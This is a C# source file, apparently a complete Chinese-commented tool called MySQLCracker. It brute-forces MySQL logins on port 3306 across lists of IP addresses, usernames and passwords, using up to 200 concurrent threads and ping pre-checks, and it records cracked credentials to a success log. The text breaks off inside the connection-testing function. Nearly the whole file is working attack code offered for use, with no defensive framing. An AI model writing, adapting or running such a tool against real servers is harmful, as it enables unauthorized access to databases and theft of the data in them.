using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Threading;
using System.Text;
using System.Linq;
using System.Collections.Concurrent;
using System.Diagnostics;
using MySql.Data.MySqlClient;
using System.Net.NetworkInformation;

namespace MySQLCracker
{
    /// <summary>
    /// MySQL暴力破解工具主程序类
    /// 用于对MySQL服务器进行批量密码破解
    /// 使用MySql.Data.MySqlClient库进行连接，支持多线程并发操作
    /// </summary>
    class Program
    {
        // 全局变量
        private static string ipFile = "ips.txt";       // IP文件路径
        private static string userFile = "user.txt";   // 用户文件路径
        private static string passwordFile = "password.txt"; // 密码文件路径
        private static int threadCount = 200;           // 线程数量，提高默认值以增加初始并发性能
        private static bool isCancelled = false;        // 是否取消操作
        private static CancellationTokenSource cts = new CancellationTokenSource();
        private static object summaryLock = new object();
        private static object pingLock = new object();
        private static int pingTimeout = 1000; // Ping超时时间（毫秒）
        private static string pingLogFile = "mysql_ping_test.txt"; // Ping测试日志文件
        private static ConcurrentDictionary<string, bool> pingResultsCache = new ConcurrentDictionary<string, bool>(); // IP ping结果缓存
        private static ConcurrentDictionary<string, bool> ipCrackedCache = new ConcurrentDictionary<string, bool>(); // IP是否已爆破成功的缓存
        
        /// <summary>
        /// 记录Ping测试日志
        /// </summary>
        /// <param name="ipAddress">IP地址</param>
        /// <param name="isSuccessful">是否成功</param>
        /// <param name="message">附加消息</param>
        private static void LogPingResult(string ipAddress, bool isSuccessful, string message = "")
        {
            lock (pingLock)
            {
                try
                {
                    using (StreamWriter sw = new StreamWriter(pingLogFile, true))
                    {
                        string status = isSuccessful ? "SUCCESS" : "FAILED";
                        string logMessage = $"[{DateTime.Now}] [PING {status}] {ipAddress}";
                        if (!string.IsNullOrEmpty(message))
                        {
                            logMessage += " - " + message;
                        }
                        // 移除多余的大括号
                        sw.WriteLine(logMessage);
                    }
                }
                catch { }
            }
        }
        
        /// <summary>
        /// 测试IP是否可以ping通
        /// </summary>
        /// <param name="ipAddress">要测试的IP地址</param>
        /// <returns>如果IP可达返回true，否则返回false</returns>
        private static bool TestPing(string ipAddress)
        {
            // 先检查缓存中是否已有该IP的ping结果
            if (pingResultsCache.TryGetValue(ipAddress, out bool cachedResult))
            {
                return cachedResult;
            }
            
            try
            {
                using (Ping ping = new Ping())
                {
                    // 创建ping选项
                    PingOptions options = new PingOptions
                    {
                        DontFragment = true
                    };
                    
                    // 创建缓冲区
                    byte[] buffer = Encoding.ASCII.GetBytes("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
                    
                    // 发送ping请求
                    PingReply reply = ping.Send(ipAddress, pingTimeout, buffer, options);
                    
                    // 检查ping是否成功
                    bool isSuccessful = reply.Status == IPStatus.Success;
                    
                    // 记录ping结果
                    if (isSuccessful)
                    {
                        LogPingResult(ipAddress, true, $"响应时间: {reply.RoundtripTime}ms");
                    }
                    else
                    {
                        LogPingResult(ipAddress, false, reply.Status.ToString());
                    }
                    
                    // 将结果添加到缓存
                    pingResultsCache[ipAddress] = isSuccessful;
                    
                    return isSuccessful;
                }
            }
            catch (Exception ex)
            {
                // 捕获任何异常并记录
                LogPingResult(ipAddress, false, $"错误: {ex.Message}");
                
                // 将失败结果也添加到缓存
                pingResultsCache[ipAddress] = false;
                
                return false;
            }
        }

        // 日志文件路径
        private static string successLogFile = "mysql_success.txt";
        private static string failLogFile = "mysql_fail.txt";
        private static string summaryLogFile = "mysql_summary_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".log";

        /// <summary>
        /// 程序入口点
        /// 处理命令行参数，初始化配置，并启动爆破过程
        /// </summary>
        /// <param name="args">命令行参数数组</param>
        static void Main(string[] args)
        {
            // 设置全局异常处理，捕获所有未处理的异常
            AppDomain.CurrentDomain.UnhandledException += (sender, e) =>
            {
                Exception ex = e.ExceptionObject as Exception;
                Console.WriteLine("\n[严重错误] 程序发生未处理的异常:");
                Console.WriteLine($"  错误类型: {ex?.GetType().Name ?? "未知"}");
                Console.WriteLine($"  错误信息: {ex?.Message ?? "未知"}");
                if (ex?.InnerException != null)
                {
                    Console.WriteLine($"  内部错误: {ex.InnerException.Message}");
                }
                Console.WriteLine($"  堆栈跟踪: {ex?.StackTrace ?? "未知"}");
                Console.WriteLine("\n程序即将退出...");
                Console.WriteLine("按任意键继续...");
                Console.ReadKey(true);
            };
            
            // 设置Task异常处理，捕获异步操作中未处理的异常
            TaskScheduler.UnobservedTaskException += (sender, e) =>
            {
                e.SetObserved(); // 标记异常已处理
                Exception ex = e.Exception;
                Console.WriteLine("\n[严重错误] 异步操作发生未处理的异常:");
                Console.WriteLine($"  错误类型: {ex?.GetType().Name ?? "未知"}");
                Console.WriteLine($"  错误信息: {ex?.Message ?? "未知"}");
                if (ex?.InnerException != null)
                {
                    Console.WriteLine($"  内部错误: {ex.InnerException.Message}");
                }
                Console.WriteLine($"  堆栈跟踪: {ex?.StackTrace ?? "未知"}");
                // 不要退出程序，继续执行
            };
            Console.Title = "MySQL暴力破解工具";
            Console.WriteLine("=========================================");
            Console.WriteLine("        MySQL暴力破解工具 v1.0");
            Console.WriteLine("=========================================");
            Console.WriteLine();

            // 解析命令行参数
            if (!ParseArguments(args))
            {
                ShowHelp();
                return;
            }

            // 验证参数和文件存在性
            if (!ValidateArguments())
            {
                return;
            }

            // 初始化工作 - 在程序启动时立即执行
            Console.WriteLine("[初始化中...] 准备工作环境");
            
            // 创建日志目录
            if (!Directory.Exists("logs"))
            {
                Directory.CreateDirectory("logs");
                Console.WriteLine("  创建日志目录: logs\\");
            }
            
            // 初始化日志文件路径
            successLogFile = Path.Combine("logs", successLogFile);
            failLogFile = Path.Combine("logs", failLogFile);
            summaryLogFile = Path.Combine("logs", summaryLogFile);
            
            // 确保日志文件存在
            using (File.Create(successLogFile)) { }
            using (File.Create(failLogFile)) { }
            using (File.Create(summaryLogFile)) { }
            
            // 清理旧日志文件
            CleanupOldLogFiles();
            Console.WriteLine("  日志文件初始化完成");
            Console.WriteLine();
            
            // 显示运行配置
            Console.WriteLine("配置信息：");
            Console.WriteLine($"  IP文件: {ipFile}");
            Console.WriteLine($"  用户文件: {userFile}");
            Console.WriteLine($"  密码文件: {passwordFile}");
            Console.WriteLine($"  线程数: {threadCount}");
            Console.WriteLine();

            // 读取文件内容
            List<string> ips = ReadFileLines(ipFile);
            List<string> users = ReadFileLines(userFile);
            List<string> passwords = ReadFileLines(passwordFile);

            // 检查是否读取到有效内容
            if (ips.Count == 0 || users.Count == 0 || passwords.Count == 0)
            {
                Console.WriteLine("[错误] 无法读取有效数据，请检查输入文件!");
                if (ips.Count == 0) Console.WriteLine($"  - IP文件 '{ipFile}' 为空或不存在");
                if (users.Count == 0) Console.WriteLine($"  - 用户文件 '{userFile}' 为空或不存在");
                if (passwords.Count == 0) Console.WriteLine($"  - 密码文件 '{passwordFile}' 为空或不存在");
                return;
            }

            // 显示加载摘要
            Console.WriteLine("\n[加载完成]");
            Console.WriteLine($"  加载IP数量: {ips.Count}");
            Console.WriteLine($"  加载用户数量: {users.Count}");
            Console.WriteLine($"  加载密码数量: {passwords.Count}");

            // 计算总尝试组合数
            long totalCombinations = (long)ips.Count * users.Count * passwords.Count;
            Console.WriteLine($"  总尝试组合数: {totalCombinations:N0}");
            Console.WriteLine();

            // 提示用户确认
            Console.WriteLine("=========================================");
            Console.WriteLine("按任意键开始爆破，按ESC键取消...");
            Console.WriteLine("=========================================");
            ConsoleKeyInfo key = Console.ReadKey();
            if (key.Key == ConsoleKey.Escape)
            {
                Console.WriteLine("\n\n[操作取消] 程序已退出");
                return;
            }

            // 日志初始化已在程序启动时完成

            // 记录开始时间
            DateTime startTime = DateTime.Now;
            Console.WriteLine($"\n\n[开始时间] {startTime}");
            Console.WriteLine("=========================================");
            Console.WriteLine("[执行中] 按ESC键停止爆破...");

            // 初始化计数器
            long completedAttempts = 0;
            long successAttempts = 0;
            long failAttempts = 0;
            object progressLock = new object();

            // 启动取消按键监听
            Task.Run(() => MonitorCancelKey());

            try
            {
                // 使用数组来传递引用参数，避免lambda表达式中的ref问题
                long[] completedAttemptsArray = { completedAttempts };
                long[] successAttemptsArray = { successAttempts };
                long[] failAttemptsArray = { failAttempts };
                
                // 执行并发爆破
                ConcurrentBlast(ips, users, passwords, totalCombinations, startTime,
                              completedAttemptsArray, successAttemptsArray, failAttemptsArray,
                              progressLock);
                
                // 更新引用值
                completedAttempts = completedAttemptsArray[0];
                successAttempts = successAttemptsArray[0];
                failAttempts = failAttemptsArray[0];
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[错误] 执行过程中发生异常: {ex.Message}");
                Console.WriteLine(ex.StackTrace);
            }
            finally
            {
                // 记录结束时间
                DateTime endTime = DateTime.Now;
                TimeSpan duration = endTime - startTime;
                Console.WriteLine($"\n\n[结束时间] {endTime}");
                Console.WriteLine($"[总耗时] {duration.Hours:D2}:{duration.Minutes:D2}:{duration.Seconds:D2}");

                // 生成汇总报告
                GenerateSummaryReport(completedAttempts, successAttempts, failAttempts,
                                   duration, ips, users, passwords);

                // 显示结果摘要
                Console.WriteLine("=========================================");
                Console.WriteLine("[结果摘要]");
                Console.WriteLine($"  总尝试次数: {completedAttempts:N0}");
                Console.WriteLine($"  成功次数: {successAttempts:N0}");
                Console.WriteLine($"  失败次数: {failAttempts:N0}");
                Console.WriteLine();
                Console.WriteLine($"  成功率: {(successAttempts > 0 ? (double)successAttempts / completedAttempts * 100 : 0):0.##}%");
                Console.WriteLine($"  平均速度: {completedAttempts / Math.Max(1, duration.TotalSeconds):N0} 次/秒");
                Console.WriteLine();
                Console.WriteLine($"  成功日志: {successLogFile}");
                Console.WriteLine($"  失败日志: {failLogFile}");
                Console.WriteLine($"  汇总报告: {summaryLogFile}");
                Console.WriteLine("=========================================");
            }

            Console.WriteLine("\n按任意键退出...");
            Console.ReadKey();
        }

        /// <summary>
        /// 解析命令行参数
        /// </summary>
        /// <param name="args">命令行参数数组</param>
        /// <returns>如果解析成功返回true，否则返回false</returns>
        private static bool ParseArguments(string[] args)
        {
            try
            {
                for (int i = 0; i < args.Length; i++)
                {
                    switch (args[i].ToLower())
                    {
                        case "-i":
                            if (i + 1 < args.Length)
                            {
                                ipFile = args[i + 1];
                                i++;
                            }
                            else
                            {
                                Console.WriteLine("[错误] -i 参数缺少文件路径");
                                return false;
                            }
                            break;
                        case "-u":
                            if (i + 1 < args.Length)
                            {
                                userFile = args[i + 1];
                                i++;
                            }
                            else
                            {
                                Console.WriteLine("[错误] -u 参数缺少文件路径");
                                return false;
                            }
                            break;
                        case "-p":
                            if (i + 1 < args.Length)
                            {
                                passwordFile = args[i + 1];
                                i++;
                            }
                            else
                            {
                                Console.WriteLine("[错误] -p 参数缺少文件路径");
                                return false;
                            }
                            break;
                        case "-x":
                            if (i + 1 < args.Length)
                            {
                                if (!int.TryParse(args[i + 1], out threadCount))
                                {
                                    Console.WriteLine("[错误] -x 参数必须是有效的数字");
                                    return false;
                                }
                                i++;
                            }
                            else
                            {
                                Console.WriteLine("[错误] -x 参数缺少线程数");
                                return false;
                            }
                            break;
                        case "-h":
                        case "--help":
                            ShowHelp();
                            return false;
                        default:
                            Console.WriteLine($"[错误] 未知参数: {args[i]}");
                            return false;
                    }
                }
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[错误] 解析命令行参数时发生错误: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 显示程序帮助信息
        /// </summary>
        private static void ShowHelp()
        {
            Console.WriteLine("用法: MySQLCracker.exe -i ip.txt -u user.txt -p password.txt -x 500");
            Console.WriteLine();
            Console.WriteLine("参数说明:");
            Console.WriteLine("  -i    指定IP地址文件路径（必需）");
            Console.WriteLine("  -u    指定用户名文件路径（必需）");
            Console.WriteLine("  -p    指定密码文件路径（必需）");
            Console.WriteLine("  -x    指定爆破线程数量（可选，默认100）");
            Console.WriteLine("  -h    显示帮助信息");
            Console.WriteLine();
            Console.WriteLine("文件格式:");
            Console.WriteLine("  - 每行一个IP地址/用户名/密码");
            Console.WriteLine("  - 以#开头的行将被视为注释并跳过");
            Console.WriteLine("  - 自动去除重复的条目");
            Console.WriteLine();
            Console.WriteLine("示例:");
            Console.WriteLine("  MySQLCracker.exe -i data/ips.txt -u data/users.txt -p data/passwords.txt -x 500");
            Console.WriteLine();
        }

        /// <summary>
        /// 验证参数和文件存在性
        /// </summary>
        /// <returns>如果验证成功返回true，否则返回false</returns>
        private static bool ValidateArguments()
        {
            try
            {
                // 检查必需文件是否存在
                if (!File.Exists(ipFile))
                {
                    Console.WriteLine($"[错误] IP文件不存在: {ipFile}");
                    return false;
                }

                if (!File.Exists(userFile))
                {
                    Console.WriteLine($"[错误] 用户文件不存在: {userFile}");
                    return false;
                }

                if (!File.Exists(passwordFile))
                {
                    Console.WriteLine($"[错误] 密码文件不存在: {passwordFile}");
                    return false;
                }

                // 检查线程数是否合理
                if (threadCount <= 0)
                {
                    Console.WriteLine("[错误] 线程数必须大于0");
                    return false;
                }

                // 设置更高的最大线程数限制，基于CPU核心数动态调整以提高性能
                int cpuCount = Environment.ProcessorCount;
                const int MAX_THREADS_BASE = 200; // 提高基础最大线程数以增加并发性能
                
                // 动态计算最大线程数，不超过CPU核心数的10倍且不超过基础最大值
                // 增加倍数以充分利用系统资源
                int MAX_THREADS = Math.Min(MAX_THREADS_BASE, cpuCount * 10);
                
                // 确保至少有5个线程以保持良好性能
                MAX_THREADS = Math.Max(5, MAX_THREADS);
                
                if (threadCount > MAX_THREADS)
                {
                    Console.WriteLine($"[警告] 线程数超过最大安全限制({MAX_THREADS})，已自动调整为{MAX_THREADS}");
                    Console.WriteLine($"[提示] 当前系统CPU核心数: {cpuCount}，为确保程序稳定性，线程数已限制为CPU核心数的5倍以内");
                    threadCount = MAX_THREADS;
                }


                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[错误] 验证参数时发生错误: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 读取文件内容，去除重复行和空行
        /// </summary>
        /// <param name="filePath">文件路径</param>
        /// <returns>包含文件内容的列表</returns>
        private static List<string> ReadFileLines(string filePath)
        {
            var result = new List<string>();
            var uniqueLines = new HashSet<string>();
            long lineCount = 0;
            long skippedLines = 0;
            long duplicateLines = 0;

            try
            {
                // 获取文件大小信息
                FileInfo fileInfo = new FileInfo(filePath);
                Console.WriteLine($"正在读取文件: {Path.GetFileName(filePath)} ({(fileInfo.Length / 1024.0):0.##} KB)");

                // 使用StreamReader逐行读取，避免一次性加载大文件到内存
                using (StreamReader sr = new StreamReader(filePath, Encoding.UTF8))
                {
                    string line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        lineCount++;
                        
                        // 去除前后空白字符
                        line = line.Trim();
                        
                        // 跳过空行和注释行
                        if (string.IsNullOrEmpty(line) || line.StartsWith("#"))
                        {
                            skippedLines++;
                            continue;
                        }
                        
                        // 使用HashSet自动去除重复行
                        if (!uniqueLines.Contains(line))
                        {
                            uniqueLines.Add(line);
                            result.Add(line);
                        }
                        else
                        {
                            duplicateLines++;
                        }
                    }
                }

                // 显示统计信息
                Console.WriteLine($"  总行数: {lineCount}");
                Console.WriteLine($"  有效行数: {result.Count}");
                Console.WriteLine($"  跳过行数(空行/注释): {skippedLines}");
                Console.WriteLine($"  重复行数: {duplicateLines}");

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[错误] 读取文件 '{filePath}' 时发生错误: {ex.Message}");
                Console.WriteLine($"  错误详情: {ex.GetType().Name}");
                return result; // 返回已读取的内容
            }
        }

        /// <summary>
        /// 监听取消按键（ESC键）
        /// 允许用户随时停止爆破过程
        /// </summary>
        private static void MonitorCancelKey()
        {
            try
            {
                while (true)
                {
                    if (Console.KeyAvailable)
                    {
                        ConsoleKeyInfo key = Console.ReadKey(true);
                        if (key.Key == ConsoleKey.Escape)
                        {
                            Console.WriteLine("\n[操作] 正在停止爆破...");
                            isCancelled = true;
                            cts.Cancel();
                            break;
                        }
                    }
                    Thread.Sleep(100); // 减少CPU占用
                }
            }
            catch (Exception ex)
            {
                // 静默处理错误，不影响主程序
                Debug.WriteLine($"监听取消按键时发生错误: {ex.Message}");
            }
        }

        /// <summary>
        /// 并发爆破核心函数
        /// 使用信号量控制并发数量，管理任务执行
        /// 包含内存使用监控，在内存使用过高时自动调整并发度
        /// </summary>
        /// <param name="ips">IP地址列表</param>
        /// <param name="users">用户名列表</param>
        /// <param name="passwords">密码列表</param>
        /// <param name="totalCombinations">总组合数</param>
        /// <param name="startTime">开始时间</param>
        /// <param name="completedAttempts">已完成尝试次数数组</param>
        /// <param name="successAttempts">成功尝试次数数组</param>
        /// <param name="failAttempts">失败尝试次数数组</param>
        /// <param name="progressLock">进度锁对象</param>
        // 内存监控和资源保护相关字段
        private static Process currentProcess = Process.GetCurrentProcess();
        private static bool isMemoryHigh = false; // 内存使用过高标志
        private static readonly object memoryLock = new object(); // 内存监控锁
        
        /// <summary>
        /// 获取当前进程内存使用情况（MB）
        /// </summary>
        private static double GetCurrentMemoryUsage()
        {
            currentProcess.Refresh();
            return currentProcess.WorkingSet64 / 1024.0 / 1024.0;
        }
        
        /// <summary>
        /// 检查内存使用情况并根据需要调整策略
        /// </summary>
        /// <param name="completedAttempts">已完成尝试次数数组</param>
        private static bool CheckMemoryUsage(long[] completedAttempts)
        {
            lock (memoryLock)
            {
                double memoryUsage = GetCurrentMemoryUsage();
                
                // 内存使用阈值设置为1GB，可根据系统情况调整
                const double HIGH_MEMORY_THRESHOLD = 1024;
                const double CRITICAL_MEMORY_THRESHOLD = 1536;
                
                // 检查是否达到临界内存使用
                if (memoryUsage >= CRITICAL_MEMORY_THRESHOLD)
                {
                    if (!isMemoryHigh)
                    {
                        Console.WriteLine($"\n[警告] 内存使用过高 ({memoryUsage:F1} MB)，正在调整线程策略...");
                        isMemoryHigh = true;
                    }
                    return true; // 返回true表示内存使用过高
                }
                // 如果从高内存恢复
                else if (memoryUsage < HIGH_MEMORY_THRESHOLD && isMemoryHigh)
                {
                    Console.WriteLine($"\n[信息] 内存使用恢复正常 ({memoryUsage:F1} MB)");
                    isMemoryHigh = false;
                }
                
                // 定期显示内存使用情况（每1000次尝试）
                if (completedAttempts != null && completedAttempts.Length > 0 && 
                    completedAttempts[0] % 1000 == 0 && completedAttempts[0] > 0)
                {
                    Console.WriteLine($"\n[信息] 当前内存使用: {memoryUsage:F1} MB, 已完成尝试: {completedAttempts[0]:N0}");
                }
                
                return false;
            }
        }
        
        private static void ConcurrentBlast(List<string> ips, List<string> users, List<string> passwords,
                                          long totalCombinations, DateTime startTime,
                                          long[] completedAttempts, long[] successAttempts, long[] failAttempts,
                                          object progressLock)
        {
            // 创建信号量控制并发
            int activeThreadCount = threadCount; // 活动线程数，可根据内存使用情况动态调整
            using (SemaphoreSlim semaphore = new SemaphoreSlim(activeThreadCount))
            {
                // 创建任务列表
                var tasks = new List<Task>();
                
                // 遍历所有组合
                foreach (string ip in ips)
                {
                    // 检查该IP是否已经爆破成功，如果是则跳过
                    if (ipCrackedCache.ContainsKey(ip))
                    {
                        Console.WriteLine($"\n[信息] IP {ip} 已爆破成功，跳过后续尝试");
                        // 更新计数器，跳过所有该IP的尝试
                        lock (progressLock)
                        {
                            long skippedAttempts = users.Count * passwords.Count;
                            completedAttempts[0] += skippedAttempts;
                            failAttempts[0] += skippedAttempts;
                        }
                        continue;
                    }
                    
                    foreach (string user in users)
                    {
                        // 再次检查该IP是否已经爆破成功（可能在并发任务中已成功）
                        if (ipCrackedCache.ContainsKey(ip))
                        {
                            break; // 跳出用户循环
                        }
                        
                        foreach (string password in passwords)
                        {
                            // 再次检查该IP是否已经爆破成功（可能在并发任务中已成功）
                            if (ipCrackedCache.ContainsKey(ip))
                            {
                                break; // 跳出密码循环
                            }
                            // 检查是否取消
                            if (isCancelled || cts.IsCancellationRequested)
                            {
                                Console.WriteLine("\n[操作] 已取消所有剩余任务");
                                return;
                            }

                            // 复制局部变量以避免闭包问题
                            string currentIp = ip;
                            string currentUser = user;
                            string currentPassword = password;

                            // 先对IP进行ping测试，无法ping通的直接跳过
                            if (!TestPing(currentIp))
                            {
                                lock (progressLock)
                                {
                                    failAttempts[0]++;
                                    completedAttempts[0]++;
                                }
                                // 使用专门的日志方法记录ping失败
                                LogPingResult(currentIp, false, "无法ping通，已跳过爆破");
                                continue;
                            }

                            // 添加任务到列表
                            tasks.Add(Task.Run(async () =>
                            {
                                await semaphore.WaitAsync(cts.Token);
                                try
                                {
                                    // 检查取消标志
                                    if (cts.IsCancellationRequested)
                                        return;

                                    // 检查内存使用情况
                                if (CheckMemoryUsage(completedAttempts))
                                {
                                    // 内存使用过高，临时降低并发度
                                    Thread.Sleep(100); // 给系统一些时间释放资源
                                }

                                // 测试连接
                                bool success = TestMySQLConnection(currentIp, currentUser, currentPassword);

                                    // 更新计数器
                                    lock (progressLock)
                                    {
                                        if (success)
                                        {
                                            successAttempts[0]++;
                                            // 记录该IP已爆破成功
                                            ipCrackedCache[currentIp] = true;
                                            Console.WriteLine($"\n[信息] IP {currentIp} 爆破成功，准备跳过该IP的后续尝试");
                                        }
                                        else
                                        {
                                            failAttempts[0]++;
                                        }
                                        completedAttempts[0]++;

                                        // 每次尝试都更新进度显示，确保进度实时刷新，并传递当前破解信息
                                        UpdateProgress(completedAttempts[0], totalCombinations, startTime, successAttempts[0], currentIp, currentUser, currentPassword);
                                    }
                                }
                                catch (OperationCanceledException)
                                {
                                    // 任务被取消，静默处理
                                }
                                catch (Exception ex)
                                {
                                    // 更详细的错误信息输出
                                    Console.WriteLine($"\n[错误] 处理任务时发生异常:");
                                    Console.WriteLine($"  连接信息: {currentIp}:3306, 用户: {currentUser}");
                                    Console.WriteLine($"  错误类型: {ex.GetType().Name}");
                                    Console.WriteLine($"  错误信息: {ex.Message}");
                                    // 记录到错误日志文件
                                    try
                                    {
                                        using (StreamWriter sw = new StreamWriter(failLogFile, true))
                                        {
                                            sw.WriteLine($"[{DateTime.Now}] [ERROR] {currentIp}:3306,{currentUser},{currentPassword} - {ex.Message}");
                                        }
                                    }
                                    catch (Exception logEx)
                                    {
                                        Console.WriteLine($"[警告] 无法写入错误日志: {logEx.Message}");
                                    }
                                }
                                finally
                                {
                                    semaphore.Release();
                                }
                            }, cts.Token));
                        }
                    }
                }

                // 等待所有任务完成或取消
                try
                {
                    Task.WaitAll(tasks.ToArray(), cts.Token);
                }
                catch (OperationCanceledException)
                {
                    Console.WriteLine("\n[操作] 任务已被取消");
                }
            }

            // 最后更新一次完整的进度显示
            UpdateProgress(completedAttempts[0], totalCombinations, startTime, successAttempts[0]);
        }

        /// <summary>
        /// 更新进度显示
        /// 计算并显示当前进度、速度和预计剩余时间
        /// </summary>
        /// <param name="completed">已完成的尝试次数</param>
        /// <param name="total">总尝试次数</param>
        /// <param name="startTime">开始时间</param>
        /// <param name="successes">成功次数</param>
        private static void UpdateProgress(long completed, long total, DateTime startTime, long successes, string currentIp = "", string currentUser = "", string currentPassword = "")
        {
            try
            {
                double progress = total > 0 ? (double)completed / total * 100 : 0;
                TimeSpan elapsed = DateTime.Now - startTime;
                double attemptsPerSecond = elapsed.TotalSeconds > 0 ? completed / elapsed.TotalSeconds : 0;
                double remainingSeconds = attemptsPerSecond > 0 ? (total - completed) / attemptsPerSecond : 0;
                TimeSpan remaining = TimeSpan.FromSeconds(remainingSeconds);

                // 如果有当前破解信息，则显示破解记录和进度
                if (!string.IsNullOrEmpty(currentIp) && !string.IsNullOrEmpty(currentUser) && !string.IsNullOrEmpty(currentPassword))
                {
                    Console.WriteLine($"正在破解 - IP: {currentIp}, 用户: {currentUser}, 密码：{currentPassword}  进度: {completed}/{total} ({progress:0.##}%)");
                }
                else
                {
                    // 直接在新行输出进度信息，避免光标位置处理问题
                    Console.WriteLine($"[进度] {completed:N0}/{total:N0} ({progress:0.##}%) | 速度: {attemptsPerSecond:N0}/秒 | 剩余: {remaining.Hours:D2}:{remaining.Minutes:D2}:{remaining.Seconds:D2} | 成功: {successes}");
                }
                Console.Out.Flush(); // 强制刷新输出缓冲区
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"更新进度显示时发生错误: {ex.Message}");
            }
        }

        /// <summary>
        /// 生成执行摘要报告
        /// 保存详细的执行统计信息到文件
        /// </summary>
        /// <param name="totalAttempts">总尝试次数</param>
        /// <param name="successAttempts">成功次数</param>
        /// <param name="failAttempts">失败次数</param>
        /// <param name="duration">执行时长</param>
        /// <param name="ips">IP地址列表</param>
        /// <param name="users">用户名列表</param>
        /// <param name="passwords">密码列表</param>
        private static void GenerateSummaryReport(long totalAttempts, long successAttempts, long failAttempts,
                                                TimeSpan duration, List<string> ips, List<string> users, List<string> passwords)
        {
            lock (summaryLock)
            {
                try
                {
                    using (StreamWriter writer = new StreamWriter(summaryLogFile, false, Encoding.UTF8))
                    {
                        writer.WriteLine("=========================================");
                        writer.WriteLine("         MySQL暴力破解工具 - 摘要");
                        writer.WriteLine("=========================================");
                        writer.WriteLine($"生成时间: {DateTime.Now}");
                        writer.WriteLine($"开始时间: {DateTime.Now - duration}");
                        writer.WriteLine($"结束时间: {DateTime.Now}");
                        writer.WriteLine($"总耗时: {duration.Hours:D2}:{duration.Minutes:D2}:{duration.Seconds:D2}");
                        writer.WriteLine();
                        writer.WriteLine("配置信息:");
                        writer.WriteLine($"  IP文件: {ipFile}");
                        writer.WriteLine($"  用户文件: {userFile}");
                        writer.WriteLine($"  密码文件: {passwordFile}");
                        writer.WriteLine($"  线程数: {threadCount}");
                        writer.WriteLine();
                        writer.WriteLine("数据统计:");
                        writer.WriteLine($"  加载IP数量: {ips.Count}");
                        writer.WriteLine($"  加载用户数量: {users.Count}");
                        writer.WriteLine($"  加载密码数量: {passwords.Count}");
                        writer.WriteLine($"  总尝试组合数: {totalAttempts:N0}");
                        writer.WriteLine();
                        writer.WriteLine("执行结果:");
                        writer.WriteLine($"  总尝试次数: {totalAttempts:N0}");
                        writer.WriteLine($"  成功次数: {successAttempts:N0}");
                        writer.WriteLine($"  失败次数: {failAttempts:N0}");
                        writer.WriteLine($"  成功率: {(successAttempts > 0 && totalAttempts > 0 ? (double)successAttempts / totalAttempts * 100 : 0):0.##}%");
                        writer.WriteLine($"  平均速度: {totalAttempts / Math.Max(1, duration.TotalSeconds):N0} 次/秒");
                        writer.WriteLine();
                        writer.WriteLine("日志文件:");
                        writer.WriteLine($"  成功日志: {successLogFile}");
                        writer.WriteLine($"  失败日志: {failLogFile}");
                        writer.WriteLine($"  摘要报告: {summaryLogFile}");
                        writer.WriteLine("=========================================");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"\n[错误] 生成摘要报告时发生错误: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// 清理旧的摘要日志文件
        /// 只保留最近的5个摘要文件
        /// </summary>
        private static void CleanupOldLogFiles()
        {
            try
            {
                string logDir = "logs";
                if (Directory.Exists(logDir))
                {
                    // 获取所有摘要日志文件
                    var summaryFiles = Directory.GetFiles(logDir, "mysql_summary_*.log")
                                              .Select(f => new FileInfo(f))
                                              .OrderByDescending(f => f.LastWriteTime)
                                              .ToList();

                    // 删除多余的文件，保留最近的5个
                    const int MAX_FILES = 5;
                    for (int i = MAX_FILES; i < summaryFiles.Count; i++)
                    {
                        try
                        {
                            summaryFiles[i].Delete();
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"删除旧日志文件时发生错误: {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"清理旧日志文件时发生错误: {ex.Message}");
            }
        }

        // 移除全局锁，允许并行连接尝试
        // 每个线程将有自己的MySQL连接上下文

        /// <summary>
        /// 测试MySQL连接
        /// 使用MySql.Data.MySqlClient库进行连接测试
        /// </summary>
        /// <param name="ip">MySQL服务器IP地址</param>
        /// <param name="user">用户名</param>
        /// <param name="password">密码</param>
        /// <returns>如果连接成功返回true，否则返回false</returns>
        private static bool TestMySQLConnection(string ip, string user, string password)
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();

            // 检查是否取消
            if (cts.IsCancellationRequested)
                return false;

            bool success = false;
            MySqlConnection connection = null;

            try
            {
                // 1. 创建连接字符串
                string connectionString = $"Server={ip};Port=3306;User ID={user};Password={password};Database=;Connect Timeout=1;SslMode=Disabled;";
                
                // 2. 创建MySqlConnection对象
                connection = new MySqlConnection(connectionString);
                
                // 3. 打开连接
                connection.Open();
                
                // 4. 连接成功
                success = true;
            }
            catch (Exception ex)
            {
                // 捕获异常并记录详细日志
                //Console.WriteLine($"\n[调试] 连接失败 - IP: {ip}, 用户: {user}, 密码: {password}, 错误信息: {ex.Message}");
                success = false;
            }
            finally
            {
                // 关闭连接
                if (connection != null)
                {
                    try { connection.Close(); } catch {}
                }

                sw.Stop();
                long elapsedMs = sw.ElapsedMilliseconds;

                // 记录日志
                if (success)
                {
                    string successLog = $"[{DateTime.Now:HH:mm:ss}] 成功 - IP: {ip}, 用户: {user}, 密码: {password}, 耗时: {elapsedMs}ms";
                    Console.WriteLine($"\n{successLog}");
                    lock (summaryLock)
                    {
                        try
                        {
                            File.AppendAllText(successLogFile, successLog + Environment.NewLine, Encoding.UTF8);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"\n[错误] 无法写入成功日志: {ex.Message}");
                        }
                    }
                }
                else // 记录所有失败日志
                {
                    string failLog = $"[{DateTime.Now:HH:mm:ss}] 失败 - IP: {ip}, 用户: {user}, 密码: {password}, 耗时: {elapsedMs}ms";
                    lock (summaryLock)
                    {
                        try
                        {
                            File.AppendAllText(failLogFile, failLog + Environment.NewLine, Encoding.UTF8);
                        }
                        catch (Exception ex)
                        {
